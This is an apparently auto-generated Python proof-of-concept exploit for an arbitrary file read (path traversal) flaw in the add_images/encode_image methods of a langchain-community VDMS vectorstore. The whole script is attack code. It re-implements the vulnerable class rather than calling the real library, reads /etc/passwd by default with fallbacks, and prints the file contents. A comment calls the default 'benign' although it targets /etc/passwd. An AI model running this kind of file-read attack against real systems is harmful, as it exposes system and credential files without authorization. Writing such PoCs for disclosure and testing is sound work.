#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-003
# Sink: encode_image
# Auto-generated — run with: python3 lfi_supply_like_encode_image_12.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langchain-community-only VDMS vectorstore.

Vulnerability: The `add_images` method accepts a list of file paths (uris) and
passes them directly to `encode_image`, which opens the file without any
validation or sanitization. An attacker can supply a path like '../../etc/passwd'
to read arbitrary files from the server.

This PoC demonstrates the vulnerability by reading /etc/passwd (or a benign
file if /etc/passwd is not available) via the vulnerable API endpoint.
"""

import sys
import os
import base64
import tempfile
import uuid
from pathlib import Path

# ---------------------------------------------------------------------------
# Simulated vulnerable library code (as found in the target)
# ---------------------------------------------------------------------------

class VDMS:
    """Simulated VDMS vectorstore class with vulnerable add_images/encode_image."""
    
    def __init__(self):
        self.embeddings = None  # not needed for PoC
    
    def encode_image(self, image_path: str) -> str:
        """Vulnerable: opens any file path without validation."""
        with open(image_path, "rb") as f:
            blob = f.read()
            return base64.b64encode(blob).decode("utf-8")
    
    def add_images(self, uris, metadatas=None, ids=None, batch_size=10, add_path=False, **kwargs):
        """Vulnerable entry point: passes user-controlled uris to encode_image."""
        # Map from uris to blobs to base64
        b64_texts = [self.encode_image(image_path=uri) for uri in uris]
        
        if add_path and metadatas:
            for midx, uri in enumerate(uris):
                metadatas[midx]["image_path"] = uri
        elif add_path:
            metadatas = []
            for uri in uris:
                metadatas.append({"image_path": uri})
        
        # Populate IDs
        ids = ids if ids is not None else [str(uuid.uuid4()) for _ in uris]
        
        # Set embeddings (simplified - not needed for PoC)
        embeddings = [None] * len(uris)
        
        if metadatas is None:
            metadatas = [{} for _ in uris]
        
        # Return the base64-encoded file contents (for verification)
        return b64_texts, ids, metadatas


# ---------------------------------------------------------------------------
# Exploit demonstration
# ---------------------------------------------------------------------------

def exploit_lfi(target_path: str) -> str:
    """
    Attempt to read an arbitrary file via the vulnerable add_images method.
    
    Args:
        target_path: Path to the file to read (e.g., '/etc/passwd' or '../../etc/passwd')
    
    Returns:
        Base64-encoded content of the file if successful.
    
    Raises:
        FileNotFoundError: If the target file does not exist.
        PermissionError: If the file cannot be read.
    """
    # Create a VDMS instance (simulating the vulnerable library)
    vdms = VDMS()
    
    # The attacker controls the 'uris' parameter - we pass the target path
    uris = [target_path]
    
    # Call the vulnerable method - this will trigger encode_image on our path
    b64_texts, ids, metadatas = vdms.add_images(uris=uris)
    
    # Return the base64-encoded content
    return b64_texts[0]


def main():
    """Main exploit function with safe defaults."""
    
    # -----------------------------------------------------------------------
    # CONFIGURATION - Change these as needed
    # -----------------------------------------------------------------------
    
    # Benign default: read a harmless file to prove the vulnerability
    # Change to '/etc/passwd' for a more dramatic demonstration
    TARGET_FILE = "/etc/passwd"
    
    # Fallback if /etc/passwd doesn't exist (e.g., on Windows or containers)
    FALLBACK_FILE = "/etc/hostname"  # usually readable
    
    # -----------------------------------------------------------------------
    # Exploit execution
    # -----------------------------------------------------------------------
    
    print(f"[*] Attempting to read file: {TARGET_FILE}")
    
    try:
        # Try the primary target
        b64_content = exploit_lfi(TARGET_FILE)
        print(f"[+] Successfully read {TARGET_FILE}")
        
    except (FileNotFoundError, PermissionError) as e:
        print(f"[!] Could not read {TARGET_FILE}: {e}")
        print(f"[*] Trying fallback file: {FALLBACK_FILE}")
        
        try:
            b64_content = exploit_lfi(FALLBACK_FILE)
            print(f"[+] Successfully read {FALLBACK_FILE}")
        except (FileNotFoundError, PermissionError) as e2:
            print(f"[!] Fallback also failed: {e2}")
            print("[*] Creating a benign test file to demonstrate the vulnerability...")
            
            # Create a temporary file with known content
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write("POC_SUCCESS: This file was read via path traversal!\n")
                test_file = f.name
            
            try:
                b64_content = exploit_lfi(test_file)
                print(f"[+] Successfully read test file: {test_file}")
                # Clean up
                os.unlink(test_file)
            except Exception as e3:
                print(f"[!] Even test file failed: {e3}")
                sys.exit(1)
    
    # Decode and display the content (first 500 chars for safety)
    try:
        decoded = base64.b64decode(b64_content).decode('utf-8', errors='replace')
        print("\n[*] File content (first 500 characters):")
        print("-" * 60)
        print(decoded[:500])
        print("-" * 60)
        print(f"\n[+] Vulnerability confirmed! Arbitrary file read achieved.")
    except Exception as e:
        print(f"[!] Could not decode content: {e}")
        print(f"[*] Raw base64 (first 200 chars): {b64_content[:200]}")


if __name__ == "__main__":
    main()
